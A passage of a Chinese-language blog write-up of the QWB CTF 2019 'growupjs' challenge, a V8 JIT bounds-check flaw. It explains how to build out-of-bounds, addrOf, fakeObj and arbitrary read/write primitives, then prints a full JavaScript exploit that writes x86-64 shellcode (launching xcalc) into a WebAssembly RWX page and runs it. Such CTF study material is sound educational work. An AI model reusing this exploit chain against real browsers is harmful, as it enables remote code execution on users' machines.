+<h3 id="构造完整的OOB利用"><a href="#构造完整的OOB利用" class="headerlink" title="构造完整的OOB利用"></a>构造完整的OOB利用</h3><p>构造一个<code>fakeArray</code>，其中存放的是<code>oobArray</code>的信息，获取<code>fakeArray</code>地址之后通过偏移获得它的<code>elements</code>的地址，再把该oobArray的<code>elements</code>改到理想的oobArray开始搜索的位置，这里选择布置在<code>fakeArrayAddr(array和obj之前)</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fakeArray = [</span><br><span class="line">  floatMap,       <span class="comment">// fake map</span></span><br><span class="line">  tC.u2f(<span class="number">0x0</span>),      <span class="comment">// fake properties</span></span><br><span class="line">  tC.u2f(<span class="number">0x0</span>),      <span class="comment">// fake elements</span></span><br><span class="line">  tC.u2f(<span class="number">0x100000000000</span>), <span class="comment">// fake length</span></span><br><span class="line">  <span class="number">1.1</span>,</span><br><span class="line">  <span class="number">1.2</span></span><br><span class="line">].slice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> obj = [];</span><br><span class="line"><span class="keyword">var</span> array = [];</span><br><span class="line">array.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>));</span><br><span class="line">obj.push(&#123;</span><br><span class="line">    <span class="string">'a'</span> : tC.u2f(<span class="number">0x1234</span>),</span><br><span class="line">    <span class="string">'b'</span> : tC.u2f(<span class="number">0x5678</span>) </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get fakeArray address</span></span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = tC.f2u(addrOf(fakeArray));</span><br><span class="line"><span class="keyword">var</span> oobArrayAddr = fakeArrayAddr - <span class="number">0x30</span>;</span><br><span class="line">success(<span class="string">"oobArrayAddr"</span>, oobArrayAddr);</span><br><span class="line"><span class="comment">// rewrite oobArray's element with a start_element_addr</span></span><br><span class="line">fakeArray[<span class="number">2</span>] = tC.u2f(fakeArrayAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oobArray = fakeObj(tC.u2f(oobArrayAddr));</span><br></pre></td></tr></table></figure></p>
+<p>之后找出可用的<code>oobArray[i]</code>，接着就是常规的<code>OOB</code>了。</p>
+<h3 id="构造任意地址读写"><a href="#构造任意地址读写" class="headerlink" title="构造任意地址读写"></a>构造任意地址读写</h3><p>构造一个稳定的<code>addrOf</code>以及任意地址读写。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span>&#123;</span><br><span class="line">  leakObj(newObj)&#123;</span><br><span class="line">    obj[<span class="number">0</span>].a = newObj;</span><br><span class="line">    <span class="keyword">return</span> tC.f2u(oobArray[controllableObjIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">  read(addr)&#123;</span><br><span class="line">    oobArray[controllableArrayBufIdx] = tC.u2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(array[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> tC.f2u(tmp[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  write(addr, val)&#123;</span><br><span class="line">    oobArray[controllableArrayBufIdx] = tC.u2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(array[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">    tmp[<span class="number">0</span>] = tC.u2f(val);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="wasm"><a href="#wasm" class="headerlink" title="wasm"></a>wasm</h3><p>在复现的环境中，<code>wasmInstance</code>距离存放rwx区域的地址相差<code>0xe8</code>，在不同的环境中这个偏移往往不相同。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] "</span> + str + <span class="string">" -&gt; "</span>+ hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> globalVal = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMapOpt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">  <span class="keyword">let</span> arr = [obj, obj, obj];</span><br><span class="line">  <span class="keyword">let</span> tmp = &#123;</span><br><span class="line">    oobVal: obj.length</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> [obj[tmp.oobVal], obj, arr];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; <span class="number">0x12000</span>; i++)&#123;</span><br><span class="line">  getMapOpt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMap</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = getMapOpt();</span><br><span class="line">  globalVal.push(tmp[<span class="number">1</span>]);</span><br><span class="line">  globalVal.push(tmp[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">return</span> tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get float map</span></span><br><span class="line"><span class="keyword">var</span> floatMap = getMap();</span><br><span class="line">success(<span class="string">"floatMap"</span>,tC.f2u(floatMap));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get obj map by offset</span></span><br><span class="line"><span class="keyword">var</span> objMap = tC.u2f(tC.f2u(floatMap)+<span class="number">0xa0</span>);</span><br><span class="line">success(<span class="string">"objMap"</span>,tC.f2u(objMap));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObjOpt</span>(<span class="params">fakeObjAddr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [fakeObjAddr, fakeObjAddr, fakeObjAddr];</span><br><span class="line">  <span class="keyword">let</span> tmp = &#123;</span><br><span class="line">    oobVal : arr.length</span><br><span class="line">  &#125;;</span><br><span class="line">  arr[tmp.oobVal] = objMap;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)&#123;</span><br><span class="line">  fakeObjOpt(floatMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">fakeObjAddr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = fakeObjOpt(fakeObjAddr);</span><br><span class="line">  <span class="keyword">return</span> tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get fake obj map object</span></span><br><span class="line"><span class="keyword">var</span> floatMapObj = fakeObj(floatMap);</span><br><span class="line"><span class="comment">// console.log("floatMapObj "+hex(tC.f2u(floatMapObj)));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// build addrOf primitive</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOfOpt</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [obj, obj, obj];</span><br><span class="line">  <span class="keyword">let</span> tmp = &#123;</span><br><span class="line">    oobVal : arr.length</span><br><span class="line">  &#125;;</span><br><span class="line">  arr[tmp.oobVal] = floatMapObj;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> preObj = &#123;</span><br><span class="line">  floatMapObj</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)&#123;</span><br><span class="line">  addrOfOpt(preObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = addrOfOpt(obj);</span><br><span class="line">  <span class="keyword">return</span> tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake obj array</span></span><br><span class="line"><span class="keyword">var</span> fakeArray = [</span><br><span class="line">  floatMap,       <span class="comment">// fake map</span></span><br><span class="line">  tC.u2f(<span class="number">0x0</span>),      <span class="comment">// fake properties</span></span><br><span class="line">  tC.u2f(<span class="number">0x0</span>),      <span class="comment">// fake elements</span></span><br><span class="line">  tC.u2f(<span class="number">0x100000000000</span>), <span class="comment">// fake length</span></span><br><span class="line">  <span class="number">1.1</span>,</span><br><span class="line">  <span class="number">1.2</span></span><br><span class="line">].slice(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> obj = [];</span><br><span class="line"><span class="keyword">var</span> array = [];</span><br><span class="line">array.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>));</span><br><span class="line">obj.push(&#123;</span><br><span class="line">    <span class="string">'a'</span> : tC.u2f(<span class="number">0x1234</span>),</span><br><span class="line">    <span class="string">'b'</span> : tC.u2f(<span class="number">0x5678</span>) </span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get fakeArray address</span></span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = tC.f2u(addrOf(fakeArray));</span><br><span class="line"><span class="keyword">var</span> oobArrayAddr = fakeArrayAddr - <span class="number">0x30</span>;</span><br><span class="line">success(<span class="string">"oobArrayAddr"</span>, oobArrayAddr);</span><br><span class="line"><span class="comment">// rewrite oobArray's element with a start_element_addr</span></span><br><span class="line">fakeArray[<span class="number">2</span>] = tC.u2f(fakeArrayAddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oobArray = fakeObj(tC.u2f(oobArrayAddr));</span><br><span class="line"><span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> controllableObjIdx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;maxSize; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(tC.f2u(oobArray[i]) === <span class="number">0x1234</span>)&#123;</span><br><span class="line">    controllableObjIdx = i;</span><br><span class="line">    success(<span class="string">"controllableObjIdx in oobArray"</span>,controllableObjIdx);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// search backing_store</span></span><br><span class="line"><span class="keyword">var</span> controllableArrayBufIdx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;maxSize; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(tC.f2u(oobArray[i]) === <span class="number">0x200</span>)&#123;</span><br><span class="line">    controllableArrayBufIdx = i + <span class="number">1</span>;</span><br><span class="line">    success(<span class="string">"Backing_Store in oobArray"</span>,controllableArrayBufIdx);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span>&#123;</span><br><span class="line">  leakObj(newObj)&#123;</span><br><span class="line">    obj[<span class="number">0</span>].a = newObj;</span><br><span class="line">    <span class="keyword">return</span> tC.f2u(oobArray[controllableObjIdx]);</span><br><span class="line">  &#125;</span><br><span class="line">  read(addr)&#123;</span><br><span class="line">    oobArray[controllableArrayBufIdx] = tC.u2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(array[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> tC.f2u(tmp[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  write(addr, val)&#123;</span><br><span class="line">    oobArray[controllableArrayBufIdx] = tC.u2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(array[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line">    tmp[<span class="number">0</span>] = tC.u2f(val);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wr=<span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"><span class="keyword">var</span> wasmInsAddr = wr.leakObj(wasmInstance);</span><br><span class="line">success(<span class="string">"wasmInsAddr"</span>, wasmInsAddr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var wasmInsAddr = addrOf(wasmInstance);</span></span><br><span class="line"><span class="comment">// success("wasmInsAddr", tC.f2u(wasmInsAddr));</span></span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line">rwxAddrLoc = wasmInsAddr + <span class="number">0xe8</span> - <span class="number">0x1</span>;</span><br><span class="line">rwxAddr = wr.read(rwxAddrLoc);</span><br><span class="line">success(<span class="string">"rwxAddr"</span>,rwxAddr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCalc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  shellcode = [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.length;i++)&#123;</span><br><span class="line">    wr.write(rwxAddr+i,shellcode[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  wasmFunc(); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showCalc();</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/17/QWB-CTF-2019-growupjs/006.png" alt="006"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://xz.aliyun.com/t/5870" target="_blank" rel="noopener">QWB CTF 2019 growupjs解题思路</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/73081003" target="_blank" rel="noopener">利用边界检查消除破解Chrome JIT编译器</a></li>
+<li><a href="https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/" target="_blank" rel="noopener">Circumventing Chrome’s hardening of typer bugs</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/Browser/" rel="tag"># Browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/11/CVE-2019-5782-OOB-v8/" rel="next" title="CVE-2019-5782 OOB-v8">
+                <i class="fa fa-chevron-left"></i> CVE-2019-5782 OOB-v8
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/01/01/Diary/" rel="prev" title="Diary">
+                Diary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
